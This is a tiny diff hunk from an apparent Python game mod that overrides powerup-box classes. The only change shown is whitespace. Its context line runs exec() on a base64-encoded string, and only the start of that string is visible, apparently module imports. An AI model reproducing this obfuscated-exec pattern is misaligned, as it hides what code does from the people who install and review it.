@@ -8,7 +8,7 @@ exec(base64.b64decode("CmltcG9ydCBiYSxfYmEscmFuZG9tLHRpbWUsZGF0ZXRpbWUsd2Vha3JlZ
 
 
 def enable():
-    
+
     #browser.ProfileBrowserWindow = NewProfileBrowserWindow
     pupbox.PowerupBoxFactory = NewPowerupBoxFactory
     pupbox.PowerupBox.__init__ = _pbx_
